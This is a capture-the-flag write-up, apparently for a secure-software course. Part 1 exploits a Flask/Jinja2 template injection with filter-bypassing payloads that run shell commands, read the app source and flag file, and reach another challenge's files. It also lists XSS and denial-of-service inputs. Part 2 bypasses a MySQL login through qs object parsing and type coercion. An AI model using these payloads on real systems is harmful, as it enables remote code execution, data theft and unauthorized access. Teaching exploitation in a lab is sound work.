- [Part1](#part1)
  - [Vulnerailities](#vulnerailities)
    - [View injection](#view-injection)
    - [Reflected XSS](#reflected-xss)
    - [Denial Of Service](#denial-of-service)
  - [Server Information](#server-information)
  - [Black list](#black-list)
  - [Strange Inputs](#strange-inputs)
  - [Idea](#idea)
  - [Build Payload](#build-payload)
  - [Exploits](#exploits)
  - [Access File System](#access-file-system)
  - [Dump Server Code](#dump-server-code)
  - [Parcham](#parcham)
  - [Script](#script)
    - [Execution](#execution)
    - [Demo](#demo)
  - [Warning](#warning)
- [Part2](#part2)
  - [Vulnerability](#vulnerability)
  - [URLencoded(extended)](#urlencodedextended)
  - [Prototype Pollution](#prototype-pollution)
  - [Encoding Using `qs`](#encoding-using-qs)
  - [MySQL package](#mysql-package)
    - [Arrays](#arrays)
    - [`toSqlString`](#tosqlstring)
    - [Objects](#objects)
  - [MySQL Booleans](#mysql-booleans)
  - [MySQL Chained Comparison](#mysql-chained-comparison)
  - [MySQL Implicit Type Conversion](#mysql-implicit-type-conversion)
  - [Exploit](#exploit)
  - [Script](#script-1)
    - [Execution](#execution-1)
    - [Demo](#demo-1)

# Part1

## Vulnerailities

### View injection

Sample input to test *view injection*: `{{ 7 * 7}}`  
You will see that value is computed and result is `49`.

### Reflected XSS

Sample input to test *reflected XSS*: `<img src onerror="alert(1)">`
You will receive a pop-up.  
This vulnerability is not useful to capture the falg.

### Denial Of Service

This is result of *View injection* vulnerability! By forcing server to compute a large computation, you can force it to crash!
Sample inputs:

```
1. 100000000 ** 10000000000
2. 100000000 * 3 * 10000000000
3. ...
```

After doing so, you couldn't reload the page or search something anymore, which means the server is down and you need to restart the VM.

This vulnerability is not useful to capture the falg too.

## Server Information

By sending a get request to the server, you observe below information about server:
```
server: Werkzeug/2.0.2 Python/3.8.10
```

*NOTE*: The server is a **python** web server, so we can guess with a good probability that server is using **Jinja (Jinja2)** as its view engine.

**Also by examining different inputs you can find out both search engine and its filtering are case sensitive!**

While the webserver uses *Werkzeug* library, we can [guess][mainFlask] it's based on **flask** too! Because according to [official website][mainFlask]:

>Flask depends on the Jinja template engine and the Werkzeug WSGI toolkit. The documentation for these libraries can be found at:

## Black list

the list of inputs which are blocked by the search engine is as below:
1. config
2. ': single qoutation
3. script
4. /: slash
5. .: dot
6. []
7. _: underline
8. tmp: they want to prevent us from accessing `/tmp` directory.


## Strange Inputs
1. Some inputs which violate the logic of python will result in `exception 2: something went wrong`. E.g. calling a function which doesn't exists.  
Sample input: `{{a()}}`

2. session variable seems to mean something for server because if you set input as: `{{session}}` then you will get below output: `... <NullSession {}> ...`

3. setting input as `{{g}}` will results in: `<flask.g of 'app;>` (I'm new to flask and even python but I think this is global object of application.)


## Idea
**Use Jinja filters:** Jinja like other Templete Engines have [filters][jinjaFilters] Some of them should be enabled explicitly by developer and some of them are enabled by default(Which are called [built-in filters][jinjaFilters]).

Since `.` character is filtered, we couldn't access the property of an object but we can use `attr` filter to bypass this filtering.

Since `'` character is filtered, we can use `"` insteadly to bypass it. As far as I know in any scripting language(which python is one of them) the `'` and `"` are same but in compiler languages, `'` is used to determine characters and `"` is used to determine strings.

We need to use `_` character to access some specific properties but underline character is filtered and we couldn't simply type it! Instead since the server is based on python we can pass its hexadecimal value such as `\x5f` to bypass this filtering.  
This paragraph gives us a global solution to bypass every filtering: If a character/word is filtered then, thanks to python, you can pass its hexadecimal equivalent to bypass it:)  
You can use [this website][charToHex] to do these conversions.

## Build Payload

The *[flask][mainFlask]* has a global *[request][requestFlask]* object.

From request we can get access to *[application][flaskApplication]* object. Then we can use python to open a shell and execute any process and finally get the results.  
To avoid overloaded function we start from \_\_global\_\_ variable and go down.


    
>`__globals__`: All modules in the current location will be returned as dictionary type , Methods and global variables , Used for coordination init Use 

After all, to execute any shell command, we can use following payload:
```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("SHELL COMMAND")|attr("read")()}}
```

## Exploits
To execute: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` we search below expression:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}
```

Since we get meaningful results back, we can conclude that we can execute other shell commands too.

## Access File System
Using same way we can access file system:  

```{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("ls -a")|attr("read")()}}
```

## Dump Server Code 
By searching below expression: 

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat app\x2epy")|attr("read")()}}  
We will obtain the server code:  
```

We can get the source code of website:

```
from flask import Flask, render_template_string, render_template, request 
import os, string, random 
app = Flask(__name__) 
inputfile = open("/tmp/parcham.txt", "r") #parcham.txt contains parcham 
parcham=inputfile.read(); 
def getrandom(): return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(43)) key=getrandom() f = open("_", "w") f.write(key) f.close() app.config['parcham'] = ''.join(chr(ord(parcham[i]) ^ ord(key[len(parcham)-i-1])) for i in range(len(parcham))) @app.route('/search', methods =['POST']) def search(): try: search_something = request.values.get('search_something') except Exception as e: print(e) return 'exception 1: something went wrong' try: if '.' in search_something or '_' in search_something or "'" in search_something or 'config' in search_something or '/' in search_something or 'tmp' in search_something or '[' in search_something or ']' in search_something or 'join' in search_something: return render_template_string("oh Nooo! your search expression is in my filter list") elif 'Pizza' in search_something or 'Pasta' in search_something: return render_template_string(" %s is a delicious food &#128525;" % search_something) else: return render_template_string("I'm only a baby search engine. I don't know what %s mean. Ask me about Pizza or Pasta &#128517;" % search_something) except Exception as e: print(e) return 'exception 2: something went wrong' @app.route('/', methods=['GET']) def index(): return render_template('index.html') if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) 
```

Now considering obtained source code, we can obtain the parcham in two way:
1. Reading it from `config` which is in black list but we can use `self.__dict__` insteadly. I think this is what you expect us to do.
   ```
   ...
   app.config['parcham'] = ''.join(chr(ord(parcham[i]) ^ ord(key[len(parcham)-i-1])) for i in range(len(parcham)))
   ...
   ```
2. Read from file system(`/tmp/parcham.txt`) which is my choice but probably not expected by you!
   

## Parcham
Trying to read `/tmp/parcham.txt` by entering search input as:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat \x2f\x74\x6d\x70\x2fparcham\x2etxt")|attr("read")()}}
```

and **getting parcham as:**

```
parcham{N0th1ng_W0rth_Hav1ng_c0m3s_Easy}
```

I agree with parcham:)

## Script
A simple [shell script][shellScript] is provided to automate this process!

### Execution
To execute this script you don't need any prerequest! Just run it as a typical binary:

```
$ ./exploit.sh
```

### Demo
Here is a demo of executing given exploit and explaining it: [Recorded Video][record]

NOTE: This video contains both [Part 1](#part1) and [Part 2](#part2). Also please note it's encoded to `matroska(mkv)` format, so you may need to download it first and use a media player to play it because some browsers (excluding chromium) couldn't play this format.

## Warning
This vunerability is really dangerous, I even can reach *parcham* of other question too just by using this vulnerability:/

*HINT*: run `$ pwd` to find cuurrent location(e.i. location of challenge2), then traverse upward until you see challenge1 directory.

Final input to see entire code of challenge1:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat \x2e\x2e\x2f\x2e\x2e\x2fchallenge1\x2fapp\x2ejs")|attr("read")()}}
```

Besides this, I was able to dump the database of part 2 using `mysqldump`. All of information which I got using this vulnerability from part2 is available in [this directory][dumpPart2].

Anyway I'll prefer to solve other part as supposed to do.

# Part2

For solving this part, I tried a lot of methods because I didn't have any experiece with *mysql* and its features.

It's unbelievable but I even tried to forge the signature:) but after getting the entire code from vulnerability of [part1](#part1) I found out even if I forge it, I couldn't access the parcham:)

## Vulnerability

The vulnerability of this program exists in login page, we can consider it as a type of *SQL Injection*.

## URLencoded(extended)

Some part of this code is given to us which you can see it [here][code].

The first significant thing we can find, is below line:

```
app.use(bodyParser.urlencoded({extended: true}))
```

We are using `body-parser` of `express` to parse the bodies of incomming requests. We are using urlencoded which parses request with `x-www-form-urlencoded` content types.  
The useful point for us here that we are using this parser with `extended: true` option. This option [enable][expressURLE] parsing complex bodies which contains objects and arrays:

>extended: 	This option allows to choose between parsing the URL-encoded data with the querystring library (when false) or the qs library (when true). The “extended” syntax allows for rich objects and arrays to be encoded into the URL-encoded format, allowing for a JSON-like experience with URL-encoded. For more information, please see the qs library.

**NOTE:** This is not a vulnerability, it is just a feature which helps us to exploit the vulnerability which you will see later.

**RESULT:** When requests arrives to server, it uses [`qs`][qs] library to parse the requests.

## Prototype Pollution

Consider below lines:

```
    const usrname = req.body['username']; 
    const passwd = req.body['password']; 
```

The server copies our input unconditionally! This gave me the idea to do some type of *[prototype pollution][prototypePollution]*.

But there was two problem:
1. The *[Prototype Pollution][prototypePollution]* have some prerequests which is not seen here, at least these two lines doesn't satisfy none of those prerequests.
2. [`qs`][qs] doesn't allow us to override default properties:
   > By default parameters that would overwrite properties on the object prototype are ignored

If [`qs`][qs] allowed us to overwrite properties, maybe we was able to succeed in overwriting `length` attribute and bypass below condition:

```
        } else if(QueryResponse.length) { 
```

**Anyway there is no such vulnerability!**

## Encoding Using `qs`

Now, we know that server is using [`qs`][qs] library to parse the requests. It is useful to read a little bit about how it works:

1. Sending objects: To encode and send objects in [`qs`][qs], there are too many ways. We choose one of default methods arbitrary: 

> qs allows you to create nested objects within your query strings, by surrounding the name of sub-keys with square brackets []. For example, the string 'foo[bar]=baz' converts to:
> 
> 
>
```
assert.deepEqual(qs.parse('foo[bar]=baz'), {
    foo: {
        bar: 'baz'
    }
});
```
2. Sending Arrays: [`qs`][qs] also offers some way to encode and send arrays too. Here we use below method:
   
  >qs can also parse arrays using a similar [] notation:

```
var withArray = qs.parse('a[]=b&a[]=c');
assert.deepEqual(withArray, { a: ['b', 'c'] });
```

## MySQL package

According to [given code][code], server is using *[mysql]* to connect to database. So it deserves to have a knowledge about this library!

First thing that you need to know, is that server is [escaping our inputs][npmmysqlescape]:

>Alternatively, you can use ? characters as placeholders for values you would like to have escaped like this:

```
connection.query('SELECT * FROM users WHERE id = ?', [userId], function (error, results, fields) {
  if (error) throw error;
  // ...
});
```

And server is using same method:

```
    const sql = 'Select * from users where username = ? and password = ? order by id'; 
```

**So it's useless to try inject any sql command!**

But still there is a chance to attack server! 

*[mysql][npmmysql]* package offers some features:

>Different value types are escaped differently, here is how:

> Numbers are left untouched  
> Booleans are converted to `true / false`  
> Date objects are converted to `'YYYY-mm-dd HH:ii:ss'` strings  
> Buffers are converted to hex strings, e.g. `X'0fa5'`
> Strings are safely escaped  
> Arrays are turned into list, e.g. `['a', 'b']` turns into `'a', 'b'`  
> Nested arrays are turned into grouped lists (for bulk inserts), e.g. `[['a', 'b'], ['c', 'd']]` turns into `('a', 'b'), ('c', 'd')`  
> Objects that have a `toSqlString` method will have `.toSqlString()` called and the returned value is used as the raw SQL.  
> Objects are turned into `key = 'val'` pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, `toString()` is called on it and the returned value is used.  
> `undefined / null` are converted to `NULL`.  
> `NaN / Infinity` are left as-is. MySQL does not support these, and trying to insert them as values will trigger MySQL errors until they implement support.

From these features we can use some of them to causes some problem or make the attack. All of solutions which I tried will be brought in next subsections.

### Arrays

Sending Arrays as inputs, will cause the mysql server to return an error.

E.g. If you send below request to the server:

```
username=parcham&password[]=1&password[]=2
```

Server will build following query:

```

    Select * from users where username = 'parcham' and password = '1', '2' order by id; 
    
```

Which results in following error:

```
Unknown error: Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ', '2' order by id' at line 1
```

Also you can test nested Array samely:  
* Request: `username=parcham&password[0][]=1&password[0][]=2`
* SQL Query: `
    Select * from users where username = 'parcham' and password = ('1', '2') order by id; `
* Result: `Unknown error: Error: ER_OPERAND_COLUMNS: Operand should contain 1 column(s)`

### `toSqlString`
The [8'th feature](#mysql-package) says if an object has `toSqlString` method then *[mysql][npmmysql]* will call this function and use the result as raw query. **It means there is no escaping!**

So if we send password as an object like below:

```
password = {
  toSqlString: function(){return "' or 1=1 --";}
}
```
We can bypass escaping filters.

I tried so many ways to send an object having this method but it seems there is impossible to encode functions of objects, at least *[qs][qs]* library doesn't offer any way to do it!

### Objects

Another feature of *[qs][qs]* is to encode objects.

Let's test this feature with following random input:

```
username=parcham&password[a]=test
```

Upon this request, Server responds as below:

```
Unknown error: Error: ER_BAD_FIELD_ERROR: Unknown column 'a' in 'where clause'
```

And if you test on a local server, you can find out the built query is like below:

```
    Select * from users where username = 'parcham' and password = `a` = 'test' order by id; 
```

By some searching about mysql server, you find out when a phrase is surrounded by `` ` `` character (i.e. *backtick* or *grave accent*) then that phrase is considered as table name or column name.  
Given this information the error is more clear now! *Mysql* is stating there is no column named `a`.

Another strange syntax in this query, is chained comparisons which is completely new to me and I'll give you an overview in [later](#mysql-chained-comparison).

## MySQL Booleans

**In MySQL Booleans are just numbers.** It means true values will converts to `1` and false values will results in `0`.

It's easy to verify this [claim][mySQLBool]:

>MySQL does not have built-in Boolean type. However, it uses `TINYINT(1)` instead. To make it more convenient, MySQL provides `BOOLEAN` or `BOOL` as the synonym of `TINYINT(1)`.
>
>In MySQL, zero is considered as false, and non-zero value is considered as true. To use Boolean literals, you use the constants `TRUE` and `FALSE` that evaluate to 1 and 0 respectively. See the following example:

```
SELECT true, false, TRUE, FALSE, True, False;
-- 1 0 1 0 1 0
```

## MySQL Chained Comparison

*MySQL* allows you to have chained comparison in *where clause*! for example following query contains chained comparison in its *where clause*:

```
select * from someTable where one = two = three
```

Where `one`, `two` and `three` can be columns or values.

One important point to exploit this website is to know how *Chained Comparisons* will be evaluated.

In summary, *MySQL* Starts from most left comparison and evalutates it. Then after determining results as `false` or `true`, it continues to the most right comparison.  
For example The last query is equivalent with following one:

```
select * from someTable where (one = two) = three;
```

NOTE: `(one = two)` will be replaced by `true` or `false` depending on values.

You can find more details [here][mySQLChainedComp].

## MySQL Implicit Type Conversion
When it comes to mathematical computation(including both operations and comparisons), MySQL [tries to convert][mySQLConversion] all operands to the same type:

>When an operator is used with operands of different types, type conversion occurs to make the operands compatible. Some conversions occur implicitly. For example, MySQL automatically converts strings to numbers as necessary, and vice versa. 

```
mysql> SELECT 1+'1';
        -> 2
mysql> SELECT CONCAT(2,' test');
        -> '2 test'
```

Having this piece of puzzle, we are ready to connect all of this information and write our exploit:)

## Exploit

To exploit vulnerability, we should send following request:

```
username=parcham&password[password]=1
```

This request results in following query in server side:

```
    Select * from users where username = 'parcham' and password = `password` = '1' order by id; 
```

First off, MySQL evaluates `` password = `password` ``! This is true and hence it will return `1` and query is equivalent with following query:

```
    Select * from users where username = 'parcham' and 1 = '1' order by id; 
```

Secondly, We have different types in `1 = '1' ` where clause. MySQL does type conversion to evaluates this part and we can consider it same as following query:

```
    Select * from users where username = 'parcham' and 1 = 1 order by id; 
```

Which is true and username is correct too! 

As you saw, we bypassed login page without entering password.

**This is exactly what we learned from *Secure Software Systems* course: Every feature is a bug!**

## Script
A simple [shell script][shellScript2] is provided to automate this process.

### Execution
To execute this script you don't need any prerequest! Just run it as a typical binary:

```
$ ./exploit.sh
```

### Demo
Here is a demo of executing given exploit and explaining it: [Recorded Video][record]

NOTE: This video contains both [Part 1](#part1) and [Part 2](#part2)! [Part 2](#part2) will be started from 00:09:15 timeframe. Also please note it's encoded to `matroska(mkv)` format, so you may need to download it first and use a media player to play it because some browsers (excluding chromium) couldn't play this format.


[jinjaFilters]: https://jinja.palletsprojects.com/en/2.10.x/templates/#list-of-builtin-filters
[mainFlask]: https://flask.palletsprojects.com/en/2.0.x/
[requestFlask]: https://flask.palletsprojects.com/en/2.0.x/api/#flask.request
[flaskApplication]: https://flask.palletsprojects.com/en/2.0.x/api/#flask.Request.application
[charToHex]: https://www.rapidtables.com/convert/number/ascii-to-hex.html
[dumpPart2]: ./part1/dumpPart2/
[code]: ./part2/app.js
[expressURLE]: https://expressjs.com/en/api.html#express.urlencoded
[qs]: https://www.npmjs.com/package/qs#readme
[prototypePollution]: https://www.neuralegion.com/blog/prototype-pollution/
[npmmysql]: https://www.npmjs.com/package/mysql
[npmmysqlescape]: https://www.npmjs.com/package/mysql#escaping-query-values
[mySQLBool]: https://www.mysqltutorial.org/mysql-boolean/
[mySQLChainedComp]: https://stackoverflow.com/q/28952960/10813146
[mySQLConversion]: https://dev.mysql.com/doc/refman/8.0/en/type-conversion.html
[shellScript]: ./part1/exploit.sh
[shellScript2]: ./part2/exploit.sh
[record]: https://mega.nz/file/dlUiBLjJ#TgLrkoDU1UU6GLUusC8uSneww1ynFGkmHd3rvIiysGc